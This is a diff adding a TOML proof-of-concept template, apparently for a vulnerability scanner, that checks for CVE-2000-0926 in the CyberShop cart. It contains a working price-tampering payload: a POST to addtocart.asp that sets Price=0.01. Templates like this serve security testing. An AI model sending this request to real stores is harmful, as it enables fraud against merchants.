@@ -1,0 +1,39 @@
+[info]
+author = "ave"
+description = "SmartWin CyberOffice Shopping Cart 2 (CyberShop) stores price in a hidden form field, allowing remote attackers to modify purchase price by altering the 'Price' parameter in HTTP POST requests."
+id = "POC-AVE-2000-0679"
+name = "CVE-2000-0926 PoC"
+severity = "medium"
+tags = [
+    "cve-2000-0926",
+    "ave-2000-0679",
+]
+vuln_id = [
+    "CVE-2000-0926",
+    "AVE-2000-0679",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/shop/addtocart.asp"
+protocol = "http"
+
+[poc.requests.body]
+content = "ProductID=1&Quantity=1&Price=0.01"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "success",
+    "added",
+    "cart",
+]
